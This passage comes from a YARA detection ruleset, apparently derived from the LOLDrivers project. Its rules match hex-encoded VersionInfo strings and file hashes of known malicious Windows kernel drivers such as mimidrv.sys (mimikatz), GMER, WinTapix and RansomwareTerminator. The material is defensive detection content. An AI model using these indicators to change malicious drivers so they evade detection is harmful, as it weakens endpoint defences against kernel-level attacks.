		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]005200570054004b0072006c002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310036002000500069006e006300680069006e007300200054006500630068006e006f006c006f0067007900200043006f002e002c004c00740064002e }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Gmer_Gmersys_Gmer_0052
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - gmer64.sys, superman.sys"
		author = "Florian Roth"
		id = "a2197304-4455-52bb-ac73-9218b310bb99"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L411-L431"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "0052aa88e42055a2eed5ddd17c3499c692360155e5e031a211edfcef577acce3"
		hash = "18c909a2b8c5e16821d6ef908f56881aa0ecceeaccb5fa1e54995935fcfd12f7"
		logic_hash = "1644a972cb9bde33e5e8ec078b0ee67b34b6a298504895f364260b96a453a3ba"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0047004d00450052002000440072006900760065007200200068007400740070003a002f002f007700770077002e0067006d00650072002e006e00650074 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0047004d00450052 }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0032002c00200030002c002000360039003800330020006200750069006c0074002000620079003a002000570069006e00440044004b }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002c00200030002c00200036003900380033 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0067006d0065007200360034002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]0047004d00450052 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0067006d0065007200360034002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200047004d0045005200200032003000300033002d0032003000310033 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Pinchinstechnologycoltd_Rwtkrlsys_Ransomwareterminator_930D
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - driver_930da474.sys"
		author = "Florian Roth"
		id = "87bff18c-cbd3-5faa-955f-d215b2f58ea0"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L434-L453"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "930da474a6d1be97b54f2c81e883e14d62897aa58622e5b040e412bd36cee0a7"
		logic_hash = "b96ea1d9788320b12743f9a50e9afe4fc8accc4e4867e34ec8b7e5134d5842ed"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200570054004b0072006c }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00500069006e006300680069006e007300200054006500630068006e006f006c006f0067007900200043006f002e002c004c00740064002e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e003800300038 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]005200570054004b0072006c002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]00520061006e0073006f006d0077006100720065005400650072006d0069006e00610074006f0072 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]005200570054004b0072006c002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310036002000500069006e006300680069006e007300200054006500630068006e006f006c006f0067007900200043006f002e002c004c00740064002e }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Mimidrv_Mimidrvmimikatz_2FAF
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys"
		author = "Florian Roth"
		id = "0160f2aa-f60f-5590-be0a-6751487eab92"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L456-L472"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "2faf95a3405578d0e613c8d88d534aa7233da0a6217ce8475890140ab8fb33c8"
		logic_hash = "e7b3f0a8f5a91896f7d487a39c622b12fc7488f9f80c80b6b551e7e5f6a67f18"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310035002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Pinchinstechnologycoltd_Rwtkrlsys_Ransomwareterminator_146B
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - driver_146b8f4f.sys"
		author = "Florian Roth"
		id = "47f0ff39-4726-5c66-90a8-981cbd53d2d1"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L475-L494"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "146b8f4fc91a4915e8f6aa6e0d871f7161a809c46760ef602bab534836142436"
		logic_hash = "25a4fec1795204ef5e6dec0f1f7f50f21362fc5105489ae387a7358446d4927c"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200570054004b0072006c }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00500069006e006300680069006e007300200054006500630068006e006f006c006f0067007900200043006f002e002c004c00740064002e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0030002e0031002e0030002e003200350031 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0030002e0038 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]005200570054004b0072006c002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]00520061006e0073006f006d0077006100720065005400650072006d0069006e00610074006f0072 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]005200570054004b0072006c002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310036002000500069006e006300680069006e007300200054006500630068006e006f006c006f0067007900200043006f002e002c004c00740064002e }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_2FD4
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys"
		author = "Florian Roth"
		id = "e77f1fc7-4700-5afe-908f-b0d206757365"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L497-L518"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "2fd43a749b5040ebfafd7cdbd088e27ef44341d121f313515ebde460bf3aaa21"
		hash = "7824931e55249a501074a258b4f65cd66157ee35672ba17d1c0209f5b0384a28"
		hash = "28f5aa194a384680a08c0467e94a8fc40f8b0f3f2ac5deb42e0f51a80d27b553"
		logic_hash = "e24fab351505faf86bd12d6dd97662542c8cf5fca09d916b716af1478f3c9ddf"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310035002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Microsoftcorporation_Ntbiosys_Microsoftrwindowsrntoperatingsystem_C0D8
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ntbios_2.sys"
		author = "Florian Roth"
		id = "f16b4b22-985a-5d39-ae51-709aa9a69d8d"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L521-L541"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "c0d88db11d0f529754d290ed5f4c34b4dba8c4f2e5c4148866daabeab0d25f9c"
		hash = "96bf3ee7c6673b69c6aa173bb44e21fa636b1c2c73f4356a7599c121284a51cc"
		logic_hash = "74ad0b57644d82a77bc902786250156f5e3700671bdf9765055b5908dc345a67"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006e007400620069006f00730020006400720069007600650072 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0035002c00200030002c00200032002c00200031 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002c00200030002c00200032002c00200031 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e007400620069006f002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]0020004d006900630072006f0073006f00660074002800520029002000570069006e0064006f0077007300200028005200290020004e00540020004f007000650072006100740069006e0067002000530079007300740065006d }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e007400620069006f0073002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000300033 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Microsoftcorporation_Wintapixsys_Microsoftwindowsoperatingsystem_8578
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - WinTapix.sys, SRVNET2.SYS"
		author = "Florian Roth"
		id = "0bb182e8-e64b-5b01-9ca5-105212ebeb51"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L544-L564"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "8578bff36e3b02cc71495b647db88c67c3c5ca710b5a2bd539148550595d0330"
		hash = "1485c0ed3e875cbdfc6786a5bd26d18ea9d31727deb8df290a1c00c780419a4e"
		logic_hash = "dd85f0dc471425fe692e5a51580a97facdaea45505c48b5e01dd6dbc975f2ffe"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570069006e0064006f007700730020004b00650072006e0065006c00200045007800650063007500740069007600650020004d006f00640075006c0065 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0033002e0039003600300030002e003100360033003800340020002800770069006e0062006c00750065005f00720074006d002e003100330030003800320031002d00310036003200330029 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0033002e0039003600300030002e00310036003300380034 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00570069006e00540061007000690078002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f0066007400ae002000570069006e0064006f0077007300ae0020004f007000650072006100740069006e0067002000530079007300740065006d }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00570069006e00540061007000690078002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Microsoftcorporation_Usbxhcisys_Microsoftwindowsoperatingsystem_290B
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - driver_290bc782.sys"
		author = "Florian Roth"
		id = "aa50e42c-7b09-535d-9c2c-e9e11872e695"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L567-L586"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "290bc7822da41f0b5580b27c8d14a2a5c3fbe3e4b6921957b134efc6beeb0aeb"
		logic_hash = "6153c594c5b261644e1ed03f4187227af0bdf16ad5576a7df431e07a28b73432"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005500530042002000580048004300490020004400720069007600650072 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0032002e0039003200300030002e003200320030003900390020002800770069006e0038005f006c00640072002e003100370030003200310032002d00300036003000300029 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0032002e0039003200300030002e00320032003000390039 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0075007300620078006800630069002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f0066007400ae002000570069006e0064006f0077007300ae0020004f007000650072006100740069006e0067002000530079007300740065006d }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0075007300620078006800630069002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Basil_Windivertsys_Windivertdriver_8DA0
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - windivert.sys"
		author = "Florian Roth"
		id = "b2c5b02b-7fe2-5dcc-8c96-c67212780220"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L589-L610"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "8da085332782708d8767bcace5327a6ec7283c17cfb85e40b03cd2323a90ddc2"
		hash = "2f43f4251be4d72dd56c91bf6cce475d379eb9ba6c4dda2be3022ea633d5e807"
		hash = "8248306bcc5fae20fd4f3d5c44f962c85cddbe020b34a1799350ce2034154b7d"
		logic_hash = "ec4c9f576f33bdb22610fb9f4462b7a6c113ad704b1f6908e949dc65dde28bd5"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400680065002000570069006e00440069007600650072007400200032002e003200200064007200690076006500720020005b00550052004c003a002000680074007400700073003a002f002f0072006500710072007900700074002e006f00720067002f00770069006e006400690076006500720074002e00680074006d006c005d0020005b0042006900740063006f0069006e003a00200031004300350076005a0056005300620069007a00500065005a00380079006400540059006800550066006d0034004c004100320063004e007700420066006300590068005d }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0042006100730069006c }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0032 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0032 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00570069006e004400690076006500720074002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e00440069007600650072007400200032002e00320020006400720069007600650072 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00570069006e004400690076006500720074002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200042006100730069006c00200032003000310031002d0032003000320032 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Microsoftcorporation_Wantdsys_Microsoftwindowsoperatingsystem_E7AF
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - wantd_6.sys"
		author = "Florian Roth"
		id = "5f883209-6887-5cb4-96bb-988898d47c09"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L613-L635"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "e7af7bcb86bd6bab1835f610671c3921441965a839673ac34444cf0ce7b2164e"
		hash = "b9dad0131c51e2645e761b74a71ebad2bf175645fa9f42a4ab0e6921b83306e3"
		hash = "8d9a2363b757d3f127b9c6ed8f7b8b018e652369bc070aa3500b3a978feaa6ce"
		hash = "06a0ec9a316eb89cb041b1907918e3ad3b03842ec65f004f6fa74d57955573a4"
		logic_hash = "b4d12069a9a3a8d8d9bde9a4ed3f80f21f2654b6f96943d201933198678d01d9"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570041004e0020005400720061006e00730070006f007200740020004400720069007600650072 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e0031003100370032 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e0031003100370032 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00770061006e00740064002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f00660074002000570069006e0064006f007700730020004f007000650072006100740069006e0067002000530079007300740065006d }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00770061006e00740064002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Chingachgukdengerk_Vusbbussys_Virtualusbbusdriver_B4F3
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - driver_b4f33ffe.sys"
		author = "Florian Roth"
		id = "68298157-58f2-51de-b534-f86bdefe00a6"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L638-L657"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "b4f33ffef069c18e8a8834eb448dd1f1dbdaae93b140cfff5a1db015eb3ada2f"
		logic_hash = "00c68cc29903f0a92d8ff711ab539c97033ba03efa5f895005da925db897bdd8"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c002000550053004200200062007500730020006400720069007600650072 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004300680069006e006700610063006800670075006b00200026002000440065006e0067006500720032006b }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0030002e00310020006200750069006c0074002000620079003a002000570069006e00440044004b }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0030002e0031 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0076007500730062006200750073002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072007400750061006c002000550053004200200062007500730020006400720069007600650072 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0076007500730062006200750073002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900320030003000340020004200790020004300680069006e006700610063006800670075006b00200026002000440065006e0067006500720032006b }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_30E0
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys"
		author = "Florian Roth"
		id = "888de0dc-5643-5e55-8272-9363cc55bfcf"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L660-L680"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "30e083cd7616b1b969a92fd18cf03097735596cce7fcf3254b2ca344e526acc2"
		hash = "a906251667a103a484a6888dca3e9c8c81f513b8f037b98dfc11440802b0d640"
		logic_hash = "e2c964f7e30da210778e8a2e5bb96d53485a0736cf3ff28bccbefacb6b46765a"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310033002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Pinchinstechnologycoltd_Rwtkrlsys_Ransomwareterminator_090D
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - driver_090d409f.sys"
		author = "Florian Roth"
		id = "5c1070f6-a282-5cee-b9bc-ea833b766e1f"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L683-L703"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "090d409f86430e078694e621ad0bd5e458d32aa727f0eb99bda3961577df8d49"
		hash = "04e1f364c0fcebaa1f0833c0595a976d0625ed3390441b4f2d1aedb314bf2497"
		logic_hash = "079ccac2c3427b198a0873ee69ab4ce8631a4b35fa3829468883a0acf2852b94"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200570054004b0072006c }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00500069006e006300680069006e007300200054006500630068006e006f006c006f0067007900200043006f002e002c004c00740064002e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e003800300037 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]005200570054004b0072006c002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]00520061006e0073006f006d0077006100720065005400650072006d0069006e00610074006f0072 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]005200570054004b0072006c002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310036002000500069006e006300680069006e007300200054006500630068006e006f006c006f0067007900200043006f002e002c004c00740064002e }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Microsoftcorporation_Wantdsys_Microsoftwindowsoperatingsystem_6908
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - wantd_2.sys"
		author = "Florian Roth"
		id = "3bd8b888-8170-5da6-ba1c-f13c1ca27e6f"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L706-L725"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "6908ebf52eb19c6719a0b508d1e2128f198d10441551cbfb9f4031d382f5229f"
		logic_hash = "9cde0a399b852038979993375be2a6d0f9f9f760381e94df0190256e8810949f"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570041004e0020005400720061006e00730070006f007200740020004400720069007600650072 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e003900330038 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e003900330038 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00770061006e00740064002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f00660074002000570069006e0064006f007700730020004f007000650072006100740069006e0067002000530079007300740065006d }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00770061006e00740064002e007300790073 }
